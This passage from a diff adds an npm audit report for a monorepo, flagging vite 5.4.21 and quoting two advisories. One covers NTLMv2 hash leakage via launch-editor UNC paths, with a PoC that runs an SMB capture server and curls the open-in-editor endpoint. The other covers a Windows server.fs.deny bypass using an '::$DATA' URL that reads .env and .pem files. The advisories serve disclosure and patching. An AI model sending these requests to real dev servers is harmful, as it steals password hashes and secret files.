+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-v6wh-96g9-6wx3\n- https://github.com/advisories/GHSA-v6wh-96g9-6wx3",
+      "created": "2026-06-15T17:18:31.000Z",
+      "id": 1120784,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nThe `launch-editor` NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host, causing the userΓÇÖs NTLMv2 password hash to be leaked to an attacker-controlled SMB server. This can result in credential compromise through offline hash cracking.\n\n### Impact\n\nIf the following conditions are met, an attacker can get the NTLMv2 password hash on the computer that is using the `launch-editor`:\n\n- using Windows\n- NTLM is not disabled ([it is recommended to disable](https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526), while it's still enabled by default)\n- the user accesses the attackers website that sends request to a middleware using `launch-editor`\n- the server that has the middleware using `launch-editor` is running\n- the attacker knows the URL for that server and the middleware\n\nThis would be a problem if the user password is too simple that it can be identified through offline hash cracking, potentially leading to further compromise of developer accounts or internal systems.\n\n### Details\n`launch-editor` accepts file paths without validating or restricting Windows UNC paths such as:\n\n```\n\\\\attacker-host\\share\n```\n\nOn Windows systems, accessing a UNC path triggers an automatic NTLM authentication attempt to the remote SMB server. No user interaction or warning is required for this authentication attempt to occur.\n\nIf an attacker controls the SMB server referenced by the UNC path the victimΓÇÖs NTLMv2 hash is transmitted to the attacker. The attacker can then capture the hash and perform offline password cracking. Successful cracking reveals the victimΓÇÖs cleartext password.\n\nThe attacker could target a developer that uses a development server using `launch-editor` to develop code locally, send them a link and grab their NTLMv2 hash.\n\n### PoC\nFrom the attacker side, we will setup an SMB server. I personally used [Impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py), but you could use something like [Responder](https://github.com/lgandx/Responder) for this as well. For keeping it simple, we will use `smbserver.py` here.\n\nFirst, let's create a directory to serve as an SMB share.\n```\nmkdir /tmp/data\necho \"Hello world\" > /tmp/data/test.txt\n```\n\nThen, start the SMB server.\n```\n$ sudo smbserver.py -smb2support -debug share /tmp/data\n```\n\nNow, run any project that uses the launch-editor package. I have setup a simple \"Hello world\" project that uses Vite to do this. Then run the project locally (`vite`).\n\nNow last, we will open a browser window and navigate to the URL used by the launch-editor package to trigger the NTLM authentication. Or we can use `curl` to achieve the same.\n\n```\ncurl 'http://localhost:5173/__open-in-editor?file=%5c%5c127.0.0.1%5cshare%5ctest.txt'\n```\n\nNote the IP address in the HTTP request, and make sure it connects to the IP address of the SMB server. Now we can look at the logs of `smbserver.py` and see the NTLMv2 hash coming in.\n\n<img width=\"1916\" height=\"277\" alt=\"2026-01-30_10-58\" src=\"https://github.com/user-attachments/assets/2f606e8f-c9bb-41dc-b507-ea6606b53368\" />",
+      "reported_by": null,
+      "title": "launch-editor: NTLMv2 hash disclosure via UNC path handling on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53632"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": "<=6.4.2",
+      "github_advisory_id": "GHSA-v6wh-96g9-6wx3",
+      "recommendation": "Upgrade to version 6.4.3 or later",
+      "patched_versions": ">=6.4.3",
+      "updated": "2026-06-15T17:18:32.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-73",
+        "CWE-522"
+      ],
+      "url": "https://github.com/advisories/GHSA-v6wh-96g9-6wx3"
+    },
+    "1120789": {
+      "findings": [
+        {
+          "version": "5.4.21",
+          "paths": [
+            "apps\\web > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-fx2h-pf6j-xcff\n- https://github.com/advisories/GHSA-fx2h-pf6j-xcff",
+      "created": "2026-06-15T17:17:45.000Z",
+      "id": 1120789,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)\n- either of:\n  - the sensitive file exists in an NTFS volume\n  - the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)\n\n### Details\n\nViteΓÇÖs dev server denies direct access to sensitive files through `server.fs.deny`, including entries such as `.env`, `.env.*`, and `*.{crt,pem}`. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.\nBecause of this, requests such as `/.env::$DATA?raw` are treated as allowed paths, while Windows resolves them to the original file's default data stream.\n\nSimilar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\nAccess via browser at `http://localhost:5173/.env::$DATA?raw`\n<img width=\"388\" height=\"129\" alt=\"deecc1315123883cfd0f9c26a002845a\" src=\"https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170\" />\n\nExample expected result:\n- `/.env::$DATA?raw` returns the contents of `.env`\n- `/tls.pem::$DATA?raw` returns the contents of `tls.pem`",
+      "reported_by": null,
+      "title": "vite: `server.fs.deny` bypass on Windows alternate paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53571"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": "<=6.4.2",
+      "github_advisory_id": "GHSA-fx2h-pf6j-xcff",
+      "recommendation": "Upgrade to version 6.4.3 or later",
+      "patched_versions": ">=6.4.3",
+      "updated": "2026-06-15T17:17:46.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fx2h-pf6j-xcff"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 4,
+      "moderate": 19,
+      "high": 9,
+      "critical": 3
+    },
+    "dependencies": 624,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 624
+  }
+}
